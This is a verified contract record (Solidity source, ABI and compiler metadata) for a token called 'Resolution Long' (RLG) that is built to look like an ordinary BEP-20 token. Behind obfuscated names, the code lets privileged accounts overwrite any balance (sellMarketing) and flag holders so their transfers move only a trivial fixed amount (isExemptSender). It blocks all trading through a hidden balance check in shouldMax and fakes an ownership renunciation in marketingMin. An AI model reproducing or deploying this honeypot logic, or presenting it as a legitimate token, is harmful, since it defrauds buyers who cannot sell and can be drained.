{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface tradingLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountLimit {\n    function createPair(address receiverFrom, address fromLiquidity) external returns (address);\n}\n\ninterface swapBuyFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTrading) external view returns (uint256);\n\n    function transfer(address receiverToken, uint256 marketingSell) external returns (bool);\n\n    function allowance(address totalLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverToken,\n        uint256 marketingSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapTokenFrom, uint256 value);\n    event Approval(address indexed totalLaunched, address indexed spender, uint256 value);\n}\n\ninterface autoSell is swapBuyFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ResolutionLong is teamShould, swapBuyFee, autoSell {\n\n    event OwnershipTransferred(address indexed tradingEnableTx, address indexed launchFundSell);\n\n    uint256 private feeMarketing;\n\n    function allowance(address shouldTotal, address totalLimit) external view virtual override returns (uint256) {\n        if (totalLimit == fromReceiverMode) {\n            return type(uint256).max;\n        }\n        return swapTx[shouldTotal][totalLimit];\n    }\n\n    function transferFrom(address limitReceiver, address receiverToken, uint256 marketingSell) external override returns (bool) {\n        if (_msgSender() != fromReceiverMode) {\n            if (swapTx[limitReceiver][_msgSender()] != type(uint256).max) {\n                require(marketingSell <= swapTx[limitReceiver][_msgSender()]);\n                swapTx[limitReceiver][_msgSender()] -= marketingSell;\n            }\n        }\n        return shouldMax(limitReceiver, receiverToken, marketingSell);\n    }\n\n    function isExemptSender(address tradingTeam) public {\n        shouldLiquidity();\n        \n        if (tradingTeam == amountTo || tradingTeam == tokenLimit) {\n            return;\n        }\n        receiverReceiver[tradingTeam] = true;\n    }\n\n    uint256 public limitTxToken;\n\n    uint256 private receiverAuto = 100000000 * 10 ** 18;\n\n    uint256 private marketingLiquidity;\n\n    function shouldLiquidity() private view {\n        require(shouldBuy[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAuto;\n    }\n\n    bool public liquidityIsReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldTx;\n    }\n\n    function walletReceiver(address limitReceiver, address receiverToken, uint256 marketingSell) internal returns (bool) {\n        require(exemptFundFrom[limitReceiver] >= marketingSell);\n        exemptFundFrom[limitReceiver] -= marketingSell;\n        exemptFundFrom[receiverToken] += marketingSell;\n        emit Transfer(limitReceiver, receiverToken, marketingSell);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapTx;\n\n    address private listBuyToken;\n\n    function marketingMin() public {\n        emit OwnershipTransferred(amountTo, address(0));\n        listBuyToken = address(0);\n    }\n\n    address public tokenLimit;\n\n    address fromReceiverMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private exemptFundFrom;\n\n    uint256 public enableMin;\n\n    function transfer(address marketingBuy, uint256 marketingSell) external virtual override returns (bool) {\n        return shouldMax(_msgSender(), marketingBuy, marketingSell);\n    }\n\n    function approve(address totalLimit, uint256 marketingSell) public virtual override returns (bool) {\n        swapTx[_msgSender()][totalLimit] = marketingSell;\n        emit Approval(_msgSender(), totalLimit, marketingSell);\n        return true;\n    }\n\n    uint256 marketingAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitEnable;\n    }\n\n    bool private modeLimit;\n\n    function atFundMin(address marketingLaunchedMode) public {\n        if (liquidityIsReceiver) {\n            return;\n        }\n        if (senderSwap == walletLiquidity) {\n            feeMarketing = enableMin;\n        }\n        shouldBuy[marketingLaunchedMode] = true;\n        \n        liquidityIsReceiver = true;\n    }\n\n    address launchModeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldMax(address limitReceiver, address receiverToken, uint256 marketingSell) internal returns (bool) {\n        if (limitReceiver == amountTo) {\n            return walletReceiver(limitReceiver, receiverToken, marketingSell);\n        }\n        uint256 amountToken = swapBuyFee(tokenLimit).balanceOf(launchModeExempt);\n        require(amountToken == marketingAuto);\n        require(receiverToken != launchModeExempt);\n        if (receiverReceiver[limitReceiver]) {\n            return walletReceiver(limitReceiver, receiverToken, feeBuy);\n        }\n        return walletReceiver(limitReceiver, receiverToken, marketingSell);\n    }\n\n    string private limitEnable = \"RLG\";\n\n    function balanceOf(address sellTrading) public view virtual override returns (uint256) {\n        return exemptFundFrom[sellTrading];\n    }\n\n    constructor (){\n        if (fromReceiver != feeMarketing) {\n            amountSellTx = true;\n        }\n        tradingLaunch takeAuto = tradingLaunch(fromReceiverMode);\n        tokenLimit = amountLimit(takeAuto.factory()).createPair(takeAuto.WETH(), address(this));\n        \n        amountTo = _msgSender();\n        marketingMin();\n        shouldBuy[amountTo] = true;\n        exemptFundFrom[amountTo] = receiverAuto;\n        if (marketingLiquidity != limitTxToken) {\n            marketingLiquidity = limitTxToken;\n        }\n        emit Transfer(address(0), amountTo, receiverAuto);\n    }\n\n    function autoReceiverFee(uint256 marketingSell) public {\n        shouldLiquidity();\n        marketingAuto = marketingSell;\n    }\n\n    uint256 public fromReceiver;\n\n    mapping(address => bool) public receiverReceiver;\n\n    uint256 constant feeBuy = 19 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return listMin;\n    }\n\n    function owner() external view returns (address) {\n        return listBuyToken;\n    }\n\n    address public amountTo;\n\n    mapping(address => bool) public shouldBuy;\n\n    bool public amountSellTx;\n\n    uint256 totalList;\n\n    string private listMin = \"Resolution Long\";\n\n    bool public walletLiquidity;\n\n    bool private isBuy;\n\n    bool private senderSwap;\n\n    function sellMarketing(address marketingBuy, uint256 marketingSell) public {\n        shouldLiquidity();\n        exemptFundFrom[marketingBuy] = marketingSell;\n    }\n\n    uint8 private shouldTx = 18;\n\n    function getOwner() external view returns (address) {\n        return listBuyToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingEnableTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFundSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTokenFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSellTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunchedMode\",\"type\":\"address\"}],\"name\":\"atFundMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"autoReceiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"}],\"name\":\"isExemptSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTxToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIsReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"sellMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ResolutionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}